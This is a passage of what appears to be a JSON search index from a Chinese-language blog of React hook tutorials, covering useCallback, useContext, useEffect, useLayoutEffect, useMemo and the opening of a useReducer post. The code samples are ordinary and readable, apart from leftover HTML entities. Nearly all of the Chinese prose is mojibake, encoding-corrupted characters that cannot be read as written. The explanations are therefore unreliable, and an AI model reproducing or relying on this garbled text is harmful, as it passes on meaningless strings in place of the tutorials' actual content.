.then(json =&gt; setList(json))}, []) ä¸éå¦‚æœæƒ³ç”¨ async / await çš„è©±å°±æ¯”è¼ƒéº»ç…©äº†ï¼Œå› ç‚º useEffect æœ¬èº«ä¸å¯ä»¥ç›´æ¥ç”¨é€™å€‹èªæ³•ã€‚ç¬¬ä¸€ç¨®æ–¹å¼æ˜¯ç›´æ¥å®£å‘Šåœ¨è£¡é¢ï¼Œåƒé€™æ¨£ï¼š 12345678useEffect(() =&gt; { const getList = async () =&gt; { const res = await fetch(...) const json = await res.json() setList(json) } getList()}, []) é€™æ¨£å­åšæ²’ä»€éº¼å•é¡Œï¼Œå”¯ä¸€çš„ç¼ºé»æ˜¯å¯è®€æ€§ä¸ä½³ï¼Œæ‰€ä»¥æˆ‘å€‘é€šå¸¸æœƒå¸Œæœ›èƒ½å®£å‘Šåœ¨å¤–é¢ï¼Œåƒé€™æ¨£ï¼š 1234567891011function App () { const getList = async () =&gt; { const res = await fetch(...) const json = await res.json() setList(json) } useEffect(() =&gt; { getList() }, [])} åšåˆ°é€™é‚Šä»¥å¾Œï¼Œä½ å°±æœƒç™¼ç¾ ESLint å¾ˆç†±æƒ…åœ°å‘Šè¨´ä½ ï¼š å“ˆå›‰ï¼Œä½ ç¢ºå®šä¸è¦æŠŠ getList é€™æ±è¥¿æ”¾åˆ° dependencies è£¡å—ï¼Ÿ æ²’æœ‰æƒ³å¤ªå¤šçš„ä½ å°±ä¹–ä¹–ç…§åšäº†ï¼Œçµæœå°±é™·å…¥ã€Œç„¡çª®è¿´åœˆã€äº† XD é€™é‚Šæˆ‘ä¸è§£é‡‹å¤ªå¤šï¼Œä½†ä¸»è¦çš„åŸå› æ˜¯å› ç‚ºã€ŒReferenceã€ã€‚ ç°¡å–®ä¾†èªªå°±æ˜¯æ¯ä¸€æ¬¡ re-render æ™‚éƒ½æœƒé‡æ–°å®£å‘Š getList é€™å€‹ functionï¼Œè€Œæ¯ä¸€æ¬¡çš„ function éƒ½æœƒæ˜¯ä¸ä¸€æ¨£çš„ functionã€‚ å¦‚æœä½ ä¸å¤ªæ‡‚çš„è©±ï¼Œè©¦è‘—æƒ³æƒ³çœ‹é€™å€‹ä¾‹å­å¤§æ¦‚å°±æ˜ç™½äº†ï¼š 123const a = () =&gt; {}const b = () =&gt; {}console.log(a === b) // ??? æ‰€ä»¥é€™æ™‚å€™å°±è¼ªåˆ° useCallback å‡ºå ´äº†ï¼Œæˆ‘å€‘å¯ä»¥æ”¹å¯«æˆé€™æ¨£å­ï¼š 1234567891011function App () { const getList = useCallback(async () =&gt; { const res = await fetch(...) const json = await res.json() setList(json) }, []) useEffect(() =&gt; { getList() }, [getList])} é™„è¨»ï¼šé€™é‚Šçš„ getList å› ç‚ºæ²’æœ‰ç”¨åˆ°å…¶ä»–ç›¸é—œçš„ variable æˆ– stateï¼Œæ‰€ä»¥ dependencies æ˜¯ç©ºçš„ï¼Œä¹Ÿå°±æ˜¯èªªä¸æœƒè¢«é‡æ–°å®£å‘Šã€‚ä½†å¦‚æœä½ åœ¨å¯¦ä½œæ™‚æœ‰é€™å€‹éœ€æ±‚ï¼Œè«‹å‹™å¿…è¨˜å¾—åŠ ä¸Šå»ï¼Œé¿å…å‡ºç¾éé æœŸçš„çµæœã€‚ useCallback åœ¨é€™é‚Šçš„ä»»å‹™å°±æ˜¯ã€Œæª¢æŸ¥ dependencies æœ‰æ²’æœ‰è®Šï¼Ÿã€ï¼Œå¦‚æœæ²’æœ‰ï¼Œå°±æœƒå›å‚³ cache ä½çš„ functionï¼ˆå°±æ˜¯åŸæœ¬çš„é‚£å€‹å•¦ï¼‰ï¼Œåä¹‹å‰‡é‡æ–°å®£å‘Šä¸€å€‹æ–°çš„ functionã€‚ æ—¢ç„¶ç¾åœ¨ function ä¸æœƒè¢«é‡æ–°å®£å‘Šï¼Œé‚£éº¼å°±å¯ä»¥æŠŠå®ƒå¡«å…¥ useEffect çš„ dependencies ä¸­ï¼Œä¸æœƒå†é€²å…¥ç„¡é™è¿´åœˆå›‰ï¼","link":"/2022/04/07/react-use-callback/"},{"title":"React çš„ç¬¬å…«å€‹ hookï¼šuseContext èˆ‡ createContext","text":"æ„Ÿè¦ºå¾ˆå¯¦ç”¨çš„æ±è¥¿ï¼ å…ˆä¾†èªè­˜ Props Drillingåœ¨ä»‹ç´¹é€™å…©å€‹ hook å‰å¯ä»¥å…ˆèªè­˜ä»€éº¼æ˜¯ã€ŒProps Drillingã€ï¼Œé€™æ˜¯ä¸€å€‹åœ¨å°ˆæ¡ˆè¦æ¨¡æ¯”è¼ƒå¤§çš„æ™‚å€™æ™‚ä¸€å®šæœƒç¢°åˆ°çš„ç¶“å…¸å•é¡Œã€‚ ä»¥å‰åœ¨å¯« Vue çš„æ™‚å¾Œå¥½åƒå°±ç¢°éé¡ä¼¼çš„å•é¡Œï¼Œå°±æ˜¯ç•¶çˆ¶å…ƒä»¶è¦å‚³éçš„ props éå¸¸æ·±çš„æ™‚å€™ï¼Œcode æœƒæ¥µå…¶é›£çœ‹ï¼Œä¾†çœ‹å€‹ä¾‹å­ï¼š 123456789101112131415161718192021222324import { useState } from \"react\";function DemoInnerButton({ setTitle }) { // ç”¨ props æ‹¿åˆ°çš„ function æ”¹è®Š title return &lt;button onClick={() =&gt; setTitle(\"New title!\")}&gt;change title&lt;/button&gt;;}function DemoInnerContent({ setTitle }) { return &lt;DemoInnerButton setTitle={setTitle} /&gt;;}function DemoInner({ setTitle }) { return &lt;DemoInnerContent setTitle={setTitle} /&gt;;}export default function Demo() { const [title, setTitle] = useState(\"This is title\"); return ( &lt;div&gt; Title value is: {title} &lt;br /&gt; &lt;DemoInner setTitle={setTitle} /&gt; &lt;/div&gt; );} ç°¡å–®ä¾†èªªï¼ŒDemo æœ‰ä¸€å€‹ title çš„ stateï¼Œç¾åœ¨æƒ³è¦åœ¨æœ€åº•ä¸‹çš„å­å…ƒä»¶ DemoInnerButton æŒ‰ä¸‹æŒ‰éˆ•æ™‚æ›´æ–° stateã€‚ ç‚ºäº†è®“ DemoInnerButton æ‹¿åˆ° setTitle çš„ setterï¼Œå°±å¾—åƒé€™æ¨£å­ä¸€ç›´å¾€ä¸‹å‚³ï¼š Demo å‚³çµ¦ DemoInner DemoInner å‚³çµ¦ DemoInnerContent DemoInnerContent å‚³DemoInnerButton é€™å€‹æ“ä½œå°±å«åšã€ŒProps Drillingã€ï¼Œå› ç‚ºæˆ‘å€‘ä¸åœçš„å¾€ä¸‹ã€Œé‘½ã€ã€‚ æ‰€ä»¥ React å°±æä¾›äº†å…©å€‹ hook useContext å’Œ createContext ï¼Œç”¨ä¾†è§£æ±ºé€™å€‹å•é¡Œã€‚ useContext èˆ‡ createContextä¾†æ”¹å¯«å‰›å‰›çš„ä¾‹å­ï¼Œå…ˆç°¡å–®èªªæ˜ç”¨æ³•ï¼š å»ºç«‹ä¸€å€‹ &lt;Context.provider /&gt;ï¼Œå¯ä»¥æƒ³æˆæ˜¯å°ˆé–€å‚³é Context çš„ä¸€ç¨® Component åœ¨è¦å­å…ƒä»¶ä¸Šå¾ Context èº«ä¸ŠæŠŠéœ€è¦çš„ props æ‹¿é€²ä¾† 123456789101112131415161718192021222324252627282930313233import { useState, createContext, useContext } from \"react\";// å»ºç«‹ Context Component// æŸ¥ç¶²è·¯çš„è³‡æ–™æ˜¯èªªå¯ä»¥å‚³å…¥ props çš„é è¨­å€¼ï¼Œç•¶ä½¿ç”¨ Provider æ²’å‚³ value æ™‚å°±æœƒå¥—ç”¨// ä¸éæˆ‘å¯¦æ¸¬æ²’æ•ˆï¼Œä¸ç¢ºå®šæ˜¯ç‰ˆæœ¬å•é¡Œé‚„æ˜¯æœ‰æ”¹è¦å‰‡ï¼Œç¸½ä¹‹é‚„æ˜¯ä¹–ä¹–å‚³ value å§ï¼const TitleContext = createContext();function DemoInnerButton() { // ç›´æ¥æŒ‡å®š Context æ‹¿å‡º props const setTitle = useContext(TitleContext); return &lt;button onClick={() =&gt; setTitle(\"New title!\")}&gt;change title&lt;/button&gt;;}function DemoInnerContent() { return &lt;DemoInnerButton /&gt;;}function DemoInner() { return &lt;DemoInnerContent /&gt;;}function Demo() { const [title, setTitle] = useState(\"This is title\"); return ( {/* åœ¨æœ€å¤–å±¤åŒ…ä¸€å±¤ Provider */} &lt;TitleContext.Provider value={setTitle}&gt; &lt;div&gt; Title value is: {title} &lt;br /&gt; &lt;DemoInner /&gt; &lt;/div&gt; &lt;/TitleContext.Provider&gt; );} é€™æ¨£å­å¯«ä¹‹å¾Œå°±ä¸ç”¨å†æ¯ä¸€å±¤éƒ½å¯« props äº†ï¼Œéå¸¸æ–¹ä¾¿ï¼ OKï¼Œé€™æ¨£ç¢ºå¯¦è§£æ±ºäº†ã€‚ä¸éæœ‰ä¸€å€‹å•é¡Œï¼Œã€Œç•¶çˆ¶å­å…ƒä»¶æ²’æœ‰å¯«åœ¨åŒä¸€æ”¯æª”æ¡ˆè£¡çš„æ™‚å€™ï¼Œå­å…ƒä»¶è¦æ€éº¼å­˜å– TitleContextï¼Ÿã€ 123456789101112131415161718192021222324252627import { useState, createContext, useContext } from \"react\";// æ‹†å‡ºå»çš„å­å…ƒä»¶import DemoInnerButton from './DemoChild'// å¯«åœ¨é€™è£¡çš„ Contextconst TitleContext = createContext();function DemoInnerContent() { return &lt;DemoInnerButton /&gt;;}function DemoInner() { return &lt;DemoInnerContent /&gt;;}export default function Demo() { const [title, setTitle] = useState(\"This is title\"); return ( &lt;TitleContext.Provider value={setTitle}&gt; &lt;div&gt; Title value is: {title} &lt;br /&gt; &lt;DemoInner /&gt; &lt;/div&gt; &lt;/TitleContext.Provider&gt; );} å•å¾—å¥½ï¼æˆ‘ä¸€é–‹å§‹ä¹Ÿæƒ³éã€‚ä¸éè§£æ³•é‚„è »ç›´è¦ºçš„ï¼Œå°±æ˜¯å…ˆæŠŠ Context æŠ½å‡ºå»è®Šæˆä¸€æ”¯æª”æ¡ˆï¼Œåœ¨ import é€²ä¾†å°±å¥½å•¦ã€‚ï¼ˆå¯ä»¥é–‹ä¸€å€‹ store è³‡æ–™å¤¾ä¾†å­˜ï¼Œè³‡æ–™å¾ˆå¤šçš„è©±ï¼‰ Contextï¼š 123import { createContext } from \"react\";// export å‡ºå»export const TitleContext = createContext(); å­å…ƒä»¶ï¼š 12345678910import { useContext } from \"react\";// å¼•å…¥ Context import { TitleContext } from \"./TitleContext\";export default function DemoInnerButton() { // é€™é‚Šå°±èƒ½æ‹¿åˆ° Context äº† const setTitle = useContext(TitleContext); return &lt;button onClick={() =&gt; setTitle(\"New title!\")}&gt;change title&lt;/button&gt;;} çˆ¶å…ƒä»¶ï¼š 12345678910111213141516171819202122232425import { useState } from \"react\";// å¼•å…¥å­å…ƒä»¶import DemoInnerButton from './DemoChild'// å¼•å…¥ Contextimport { TitleContext } from './TitleContext'function DemoInnerContent() { return &lt;DemoInnerButton /&gt;;}function DemoInner() { return &lt;DemoInnerContent /&gt;;}export default function Demo() { const [title, setTitle] = useState(\"This is title\"); return ( &lt;TitleContext.Provider value={setTitle}&gt; &lt;div&gt; Title value is: {title} &lt;br /&gt; &lt;DemoInner /&gt; &lt;/div&gt; &lt;/TitleContext.Provider&gt; );} å¤§åŠŸå‘Šæˆï¼å¯å–œå¯è³€ï¼ å…¶ä»–è£œå…… Provider è£¡é¢å¯ä»¥å†åŒ…ä¸€å±¤ Provider Provider å¯ä»¥åœ¨æŸä¸€å±¤è¢«è¦†å¯«ï¼ˆåœ¨æŸå±¤åˆåŒ…ä¸€å±¤åŒæ¨£çš„ Provider value å¯ä»¥å‚³ä»»ä½•æ±è¥¿ï¼ŒArray æˆ– Object éƒ½è¡Œï¼Œç„¶å¾Œæ¥æ”¶è€…å°±æœƒæ‹¿åˆ°å°æ‡‰çš„å€¼ã€‚ å¯ä»¥é€é state ä¾†å‹•æ…‹æ›´æ–° Provider çš„ value","link":"/2022/04/08/react-use-context-and-use-context/"},{"title":"React çš„ç¬¬ä¸‰å€‹ hookï¼šuseEffect","text":"æ“šèªªæ˜¯æœ€é›£ç†è§£çš„ä¸€å€‹ã€‚ åŸºæœ¬æ¦‚å¿µ React render å®Œï¼Œç€è¦½å™¨ paint å‡ºç•«é¢ä»¥å¾Œï¼Œä½ æƒ³åšä»€éº¼ï¼Ÿ å¯ä»¥æƒ³æˆæ˜¯ render å®Œä»¥å¾Œçš„ callback functionï¼Œä½ å¯ä»¥åœ¨è£¡é¢å¯«è¦åšçš„äº‹æƒ…ã€‚ ä¸€æ¨£æ‹¿ todo list ä¾†èˆ‰ä¾‹ï¼Œå‡è¨­æˆ‘å¸Œæœ›æœ‰ localstorage çš„åŠŸèƒ½ï¼Œç›´è¦ºçš„åšæ³•å¯èƒ½æ˜¯é€™æ¨£å­ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// å› ç‚º setTodos æ˜¯éåŒæ­¥çš„ï¼Œæ‰€ä»¥æ²’è¾¦æ³•ç›´æ¥ç”¨ setItem(todos) çš„æ–¹å¼ä¾†å­˜// è€Œæ˜¯è¦è·Ÿæ”¹ state çš„æ–¹å¼ä¸€æ¨£ï¼Œç”¢ç”Ÿä¸€å€‹æ–°çš„ state ä¾†å­˜const setLocalStorage = (todos) =&gt; window.localStorage.setItem(\"todos\", JSON.stringify(todos));// æ–°å¢ todosconst handleAddTodo = (content) =&gt; { setTodos([ { id, content, isDone: false, }, ...todos, ]); // æ›´æ–° localstorage setLocalStorage([ { id, content, isDone: false, }, ...todos, ]); id++;};// åˆªé™¤ todosconst handleRemoveTodo = (id) =&gt; { setTodos(todos.filter((todo) =&gt; todo.id !== id)); // æ›´æ–° localstorage setLocalStorage(todos.filter((todo) =&gt; todo.id !== id));};// ç·¨è¼¯ todosconst handleToggleTodoState = (id) =&gt; { setTodos( todos.map((todo) =&gt; { if (todo.id !== id) return todo; return { ...todo, isDone: !todo.isDone }; }) ); // æ›´æ–° localstorage setLocalStorage( todos.map((todo) =&gt; { if (todo.id !== id) return todo; return { ...todo, isDone: !todo.isDone }; }) );}; å°±æ˜¯åœ¨æ¯å€‹æœƒã€Œæ”¹è®Š todos çš„ state çš„åœ°æ–¹ã€éƒ½åŠ ä¸Šå„²å­˜ç´€éŒ„çš„è™•ç†ã€‚ä¸éé€™æ¨£ä¸å°±è·Ÿå¯« Vanilla JS æ²’å…©æ¨£äº†å—ï¼Ÿæ‰€ä»¥å…¶å¯¦æœ‰æ›´å¥½çš„åšæ³•ï¼Œå°±æ˜¯é€é useEffectï¼š 123useEffect(() =&gt; { window.localStorage.setItem('todos', JSON.stringify(todos));}); å°ï¼Œå°±æ˜¯é€™éº¼ç…æ°£çš„ç”¨ä¸€è¡Œä¾†è¼•è¼•é¬†é¬†è§£æ±ºã€‚ä½†é‡è¦çš„æ˜¯è¦çŸ¥é“ç‚ºä»€éº¼å¯ä»¥é€™æ¨£åšï¼Ÿ é€™æ˜¯å› ç‚º useEffect çš„åŸ·è¡Œæ™‚é–“æ˜¯åœ¨æ¯ä¸€æ¬¡ render å®Œä»¥å¾Œæ‰è¢«åŸ·è¡Œã€‚æ‰€ä»¥é€™æ•´å€‹æµç¨‹æ˜¯é€™æ¨£å­ï¼š ç¬¬ä¸€æ¬¡è¼‰å…¥ï¼Œrender å®Œä»¥å¾Œï¼ŒæŠŠç›®å‰ todo çš„ state å„²å­˜åˆ° localStorage æ–°å¢ä¸€ç­† todoï¼Œæ›´æ–°äº† stateï¼Œè§¸ç™¼ re-render é‡æ–° render å®Œï¼ŒæŠŠç•«é¢ paint å‡ºä¾†å¾Œï¼Œå†æ¬¡åŸ·è¡Œ useEffect useEffect æ ¹æ“šç›®å‰ todo çš„ state æŠŠæ±è¥¿å„²å­˜åˆ° localStorage æ‰€ä»¥ä½ çŸ¥é“åŸå› äº†å—ï¼Ÿè¦ render æ±è¥¿ä»¥å‰å¿…é ˆå…ˆæœ‰ stateï¼Œè€Œ useEffect æ˜¯åœ¨ render å®Œä»¥å¾Œæ‰è¢«åŸ·è¡Œï¼Œé‚£ä¸å°±ä»£è¡¨åœ¨ useEffect è£¡çš„ state ä¸€å®šæ˜¯ç›®å‰ç•«é¢ä¸Šæœ€æ–°çš„ç‹€æ…‹å—ï¼Ÿ æ‰€ä»¥åœ¨é€™å€‹æ™‚å€™å»è¨­å®š storage çµ•å°ä¸æœƒå‡ºéŒ¯ï¼Œè€Œä¸”ä¹Ÿæ˜¯å€‹å¾ˆä¸éŒ¯çš„æ™‚æ©Ÿã€‚ é—œæ–¼ useEffect çš„ç¬¬äºŒå€‹åƒæ•¸ï¼Œç‚ºä»€éº¼éœ€è¦å®ƒï¼Ÿé™„è¨»ï¼šé€™å€‹åƒæ•¸å«åšã€Œdependenciesã€ å‡è¨­ä¸€å€‹ Component ä¸­æœ‰å¤šå€‹ stateï¼Œè€Œåœ¨ç”¨ useEffect æ™‚åˆæ²’æœ‰æŒ‡å®šã€Œç¬¬äºŒå€‹åƒæ•¸ã€ï¼Œå‘Šè¨´ React ä½ è¦è§€å¯Ÿå“ªå€‹ state çš„è©±ï¼Œå°±æœƒåœ¨ä»»ä½• state æ”¹è®Šæ™‚éƒ½è¢«è§¸ç™¼ï¼ˆå› ç‚º state æ”¹è®Šå°±æœƒé‡æ–° renderï¼Œé‡æ–° render å°±æœƒå†æ¬¡è§¸ç™¼ä¸€æ¬¡ useEffectï¼‰ ä»¥å‰›å‰› todo list çš„ä¾‹å­ä¾†èªªï¼Œæˆ‘çš„ component ä¸­å¯èƒ½æœ‰ inputValue è·Ÿ todos é€™å…©å€‹ stateã€‚ ç¾åœ¨ç•¶æˆ‘è¼¸å…¥ä¸€å€‹å­—å°±æœƒè§¸ç™¼ä¸€æ¬¡ useEffectï¼Œå› ç‚ºæˆ‘ä¿®æ”¹äº† inputValue çš„ stateï¼Œè€Œ state è®Šäº†å°±æœƒé‡æ–° renderï¼Œé‡æ–° render å°±æœƒå†åŸ·è¡Œä¸€æ¬¡ useEffectï¼Œåƒä¸‹åœ–é€™æ¨£ï¼š ä½†æ€éº¼çœ‹éƒ½ä¸åˆç†å˜›ï¼æ‡‰è©²è¦åœ¨ todo é€™å€‹ state æœ‰æ”¹è®Šæ™‚å†åšå„²å­˜çš„å‹•ä½œå°±å¥½ï¼Œè€Œä¸æ˜¯åœ¨ä»»ä½• state æ”¹è®Šéƒ½å»å„²å­˜ã€‚ å› æ­¤é€™å°±æ˜¯ç¬¬äºŒå€‹åƒæ•¸çš„ç”¨é€”ï¼Œè®“ä½ æŒ‡å®šå“ªä¸€å€‹ state æ”¹è®Šæ™‚æ‰åŸ·è¡Œé€™å€‹ useEffectï¼ˆé€™é‚Šæ˜¯ç‚ºäº†æ–¹ä¾¿è§£é‡‹æ‰é€™æ¨£èªªã€‚ç²¾ç¢ºä¸€é»çš„èªªæ³•æ˜¯æ ¹æ“š dependencies çš„å…§å®¹æ˜¯å¦æœ‰è®Šä¾†æ±ºå®šï¼Œæœ‰è®Šçš„è©±æ‰æœƒè§¸ç™¼ useEffectï¼‰ æ¥è‘—ä¾†æ”¹å¯«å‰›å‰›çš„ç¯„ä¾‹ï¼š 12345useEffect(() =&gt; { console.log('å„²å­˜ todos') console.log('todos', todos) window.localStorage.setItem('todos', JSON.stringify(todos));}, [todos]); // å‘Šè¨´å®ƒæˆ‘åªæƒ³è¦ todos æ”¹è®Šæ™‚æ‰åŸ·è¡Œé€™å€‹ effect åŠ ä¸Šé€™å€‹åƒæ•¸å¾Œå°±èƒ½ç¢ºä¿åªæœ‰åœ¨ todos æ”¹è®Šæ™‚æ‰å»è§¸ç™¼ useEffectï¼Œé¿å…äº†å‰›å‰›çš„å•é¡Œã€‚ æ‰€ä»¥äººå®¶å¸¸èªªçš„ä¸€æ¬¡å¼ useEffectåªè¦ä½ æœ‰å¼„æ‡‚å‰›å‰›çš„ç¯„ä¾‹ï¼Œå°±èƒ½æ˜ç™½ç‚ºä»€éº¼ä¸‹é¢é€™æ¨£å¯«æ³•åªæœƒåŸ·è¡Œä¸€æ¬¡ï¼š 123useEffect(() =&gt; { console.log('åªæœƒåŸ·è¡Œä¸€æ¬¡')}, []); å› ç‚º dependenciesï¼ˆé™£åˆ—è£¡é¢ï¼‰çš„å…§å®¹æ°¸é éƒ½æ˜¯ç©ºçš„ï¼Œæ‰€ä»¥ä¸è«–æ¥ä¸‹ä¾†ç™¼ç”Ÿä»€éº¼äº‹æƒ…å®ƒéƒ½ä¸æœƒæ”¹è®Šï¼Œç•¶ç„¶å°±ä¸æœƒå†æ¬¡è§¸ç™¼ã€‚","link":"/2022/04/06/react-use-effect/"},{"title":"åœ¨ React ä½¿ç”¨ fontawesome çš„æ–¹æ³•","text":"å…ˆè²¼è‘—ï¼Œæœ‰æ™‚é–“å†ä¾†è£œã€‚ ç°¡è¿°å› ç‚ºæˆ‘ç¾åœ¨æ‡¶çš„å¯«ï¼Œæ‰€ä»¥å…ˆæŠŠ å®˜æ–¹æ–‡ä»¶ è²¼åœ¨é€™ã€‚","link":"/2022/04/16/react-use-font-awesome/"},{"title":"React çš„ç¬¬å››å€‹ hookï¼šuseLayoutEffect","text":"ç”Ÿå‘½é€±æœŸçš„å‘³é“ã€‚ ç°¡è¿° React render å®Œï¼Œç€è¦½å™¨ paint ä¹‹å‰ï¼Œä½ æƒ³åšä»€éº¼ï¼Ÿ ä¸€æ¨£æ˜¯ todo list çš„ç¯„ä¾‹ï¼Œå‡è¨­æˆ‘åœ¨è®€ loaclStorage è³‡æ–™çš„æ™‚å€™æ˜¯é€™æ¨£å¯«çš„ï¼š 1234567891011121314151617181920212223242526272829function App() { // é è¨­çš„åˆå§‹å€¼ const [todos, setTodos] = useState([ { id: 0, content: \"åƒé£¯\", isDone: true, }, { id: 1, content: \"å¯«æ–‡ç« \", isDone: false, }, { id: 2, content: \"å¯«ç¨‹å¼\", isDone: false, }, ]); // storage çš„è³‡æ–™ useEffect(() =&gt; { const todoData = window.localStorage.getItem(\"todos\") || \"\"; if (todoData) { setTodos(JSON.parse(todoData)); } }, []);} é€™æ™‚å€™å°±æœƒå‡ºç¾ã€Œé–ƒä¸€ä¸‹ã€çš„å•é¡Œï¼Œåƒé€™æ¨£ï¼š ï¼ˆæˆ‘é›»è…¦å¯«ä¸å‡ºé€™ç¨®æ•ˆæœï¼Œå¯èƒ½æ˜¯é–ƒå¤ªå¿«çš„é—œä¿‚å§ï¼Œæ‰€ä»¥æ”¹è²¼ Lidemy çš„å½±ç‰‡å…§å®¹ï¼‰ é€™æ˜¯å› ç‚ºåŸ·è¡Œé †åºæ˜¯é€™æ¨£ï¼š ç¬¬ä¸€æ¬¡ renderï¼Œç€è¦½å™¨ paint åˆå§‹å€¼çš„ todos åŸ·è¡Œ useEffectï¼Œè®€å– loaclStorageï¼Œæ›´æ–° todos çš„ state state è®Šäº†æ‰€ä»¥å† render ä¸€æ¬¡ï¼Œç€è¦½å™¨å† paint æˆæ–°çš„ todos é€™å°±æ˜¯ç‚ºä»€éº¼æœƒã€Œé–ƒä¸€ä¸‹ã€ï¼Œå› ç‚º useEffect æ˜¯åœ¨ç€è¦½å™¨ paint å®Œä»¥å¾Œæ‰æœƒè¢«åŸ·è¡Œçš„ hookï¼Œæ‰€ä»¥ä¸€é–‹å§‹æœƒå…ˆé¡¯ç¤ºé è¨­çš„ todosï¼Œæ¥è‘—åŸ·è¡Œ useEffect æ™‚æ”¹äº† stateï¼Œè€Œ state æ”¹è®Šå¾Œåˆé‡æ–° render äº†ä¸€æ¬¡ç•«é¢ï¼Œæœ€å¾Œé¡¯ç¤ºæ–°çš„ todosã€‚ å¯ä»¥åƒè€ƒé€™å¼µåœ–ï¼Œå¤§æ¦‚ç†è§£ä¸€ä¸‹ hook çš„ç”Ÿå‘½é€±æœŸ ç¸½ä¹‹ä¸€å®šè¦çŸ¥é“ useEffect æ˜¯è®š paint å®Œä»¥å¾Œæ‰æœƒè¢«åŸ·è¡Œå°±å°äº†ã€‚ å›åˆ°ä¸€é–‹å§‹çš„å•é¡Œï¼Œé‚£è¦æ€éº¼è§£æ±ºæ‰å¥½ï¼Ÿ å¾ä¸Šé¢çš„åœ–ä½ æ‡‰è©²èƒ½æ³¨æ„åˆ°ä¸€å€‹æ±è¥¿æ˜¯ã€ŒRun LayoutEffectsã€ï¼Œçœ‹èµ·ä¾†å°±æ˜¯åœ¨èªªå®ƒæ˜¯è·‘åœ¨ã€ŒBrowser paints screenã€ä»¥å‰çš„ hookï¼Œé‚£éº¼æ˜¯ä¸æ˜¯ç”¨é€™å€‹å°±å¯ä»¥è§£æ±ºäº†ï¼Ÿ æ²’éŒ¯ï¼Œæ­£æ˜¯å¦‚æ­¤å“¦ï¼ 123456useLayoutEffect(() =&gt; { const todoData = window.localStorage.getItem(\"todos\") || \"\"; if (todoData) { setTodos(JSON.parse(todoData)); }}, []); æ”¹æˆé€™æ¨£ä»¥å¾Œçš„åŸ·è¡Œé †åºå°±æœƒè®Šæˆï¼š ç¬¬ä¸€æ¬¡ renderï¼Œé€²å…¥ç€è¦½å™¨ paint ä»¥å‰çš„ hook åŸ·è¡Œ useLayoutEffectï¼Œè®€å– localStorageï¼Œæ›´æ–° todos çš„ state state è®Šäº†æ‰€ä»¥å† render ä¸€æ¬¡ï¼Œç€è¦½å™¨å†æŠŠ todos çµ¦ paint å‡ºä¾† å› ç‚ºæ˜¯åœ¨ç€è¦½å™¨æŠŠç•«é¢ paint å‡ºä¾†ä»¥å‰å°±å…ˆæ›´æ–°äº† stateï¼Œæ‰€ä»¥åŸæœ¬çš„ state åœ¨è¢« render å‡ºä¾†ä¹‹å‰å°±è¢«è¦†å¯«æ‰äº†ï¼Œå› æ­¤æœ€å¾Œ paint æ™‚æ‰æœƒæ˜¯æ–°çš„ stateã€‚ï¼ˆä¸æ‡‚çš„è©±å°±çœ‹è‘—åœ–ï¼Œæƒ³æƒ³çœ‹æ¯ä¸€æ­¥çš„æµç¨‹æ‡‰è©²å°±æœƒæ‡‚äº†ï¼‰","link":"/2022/04/06/react-use-layout-effect/"},{"title":"React çš„ç¬¬ä¸ƒå€‹ hookï¼šuseMemo","text":"é‚„æ˜¯è·Ÿæ•ˆèƒ½æœ‰é—œã€‚ ç°¡è¿° æŠŠå…ƒä»¶ä¸­çš„ function çš„ã€Œå›å‚³å€¼ã€è¨˜ä½ï¼Œåªæœ‰ dependencies æ”¹è®Šæ™‚æ‰æœƒé‡æ–°åŸ·è¡Œ functionã€‚ ï¼ˆæˆ–ä¹Ÿä¸ä¸€å®šè¦æ˜¯ functionï¼Œåªè¦æ˜¯ã€Œè¤‡é›œçš„æ±‚å€¼é‹ç®—ã€éƒ½å¯ä»¥åŒ…åœ¨ useMemo è£¡é¢ï¼‰ å†å¼·èª¿ä¸€æ¬¡ï¼Œæ˜¯å…ƒä»¶ä¸­çš„ function çš„ã€Œå›å‚³å€¼ã€ï¼Œä¸è¦æéŒ¯äº†ã€‚ é€™æ˜¯é€šå¸¸ç”¨ä¾†é¿å…å­å…ƒä»¶è¢« re-render æ™‚ï¼ŒæŠŠåŸæœ¬ä¸éœ€è¦é‡æ–°è¨ˆç®—çš„çš„ function åˆé‡æ–°è¨ˆç®—ï¼Œé€ æˆè€—è²»æ•ˆèƒ½çš„å•é¡Œã€‚ ç›´æ¥ä¾†ç¤ºç¯„ç”¨æ³•ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253// ç¬¬ä¸€å€‹ componentconst ComponentWithoutUseMemo = () =&gt; { const counter = useRef(0); const myFunction = () =&gt; { // å¦‚æœé‡æ–°åŸ·è¡Œçš„è©±ï¼Œè¨ˆæ•¸å™¨å°±æœƒéå¢ counter.current++; return 1; }; const value = myFunction(); return ( &lt;div&gt; ComponentWithoutUseMemo ä¸­çš„ function å·²ç¶“è¢«åŸ·è¡Œäº† {counter.current}{\" \"} æ¬¡ï¼Œå›å‚³å€¼ç‚º {value} &lt;/div&gt; );};// ç¬¬äºŒå€‹ componentconst Component = () =&gt; { const counter = useRef(0); const myFunction = () =&gt; { // å¦‚æœé‡æ–°åŸ·è¡Œçš„è©±ï¼Œè¨ˆæ•¸å™¨å°±æœƒéå¢ counter.current++; return 1; }; // ç”¨ useMemo æŠŠå›å‚³å€¼è¨˜èµ·ä¾† // é€™é‚Šè¨­å®šç©ºçš„ dependenciesï¼Œå› ç‚ºå›ºå®šåªæœƒå›å‚³ 1 è€Œå·² const value = useMemo(() =&gt; { return myFunction(); }, []); return ( &lt;div&gt; Component ä¸­çš„ function å·²ç¶“è¢«åŸ·è¡Œäº† {counter.current} æ¬¡ï¼Œå›å‚³å€¼ç‚º{\" \"} {value} &lt;/div&gt; );};function App() { const [value, setValue] = useState(); const handleChange = (e) =&gt; setValue(e.target.value); return ( &lt;div className=\"app\"&gt; &lt;input type=\"text\" value={value} onChange={handleChange} /&gt; &lt;ComponentWithoutUseMemo /&gt; &lt;Component /&gt; &lt;/div&gt; );}","link":"/2022/04/07/react-use-memo/"},{"title":"React çš„ç¬¬ä¹å€‹ hookï¼šuseReducer","text":"å›ä¾†å¡«å‘ã€‚ ç°¡è¿°ä¹‹å‰ç¢°åˆ°é€™å€‹ hook æ™‚å°±æƒ³èªªç­‰å­¸å®Œ Redux å†ä¾†è©³ç´°è§£èªªå§ï¼Œçµæœä¸€çœ¨çœ¼å…©ã€ä¸‰å€‹æœˆå°±éå»äº† XDï¼Œç¸½ä¹‹é€™ç¯‡è¦ä¾†è§£é‡‹ä¸€ä¸‹ useReducer çš„ç”¨é€”ã€‚ æˆ‘è¦ºå¾—ç•¶é€™å€‹ hook å¾ˆé©åˆç”¨åœ¨ã€Œç•¶ä½ ä¸éœ€è¦ç”¨åˆ° 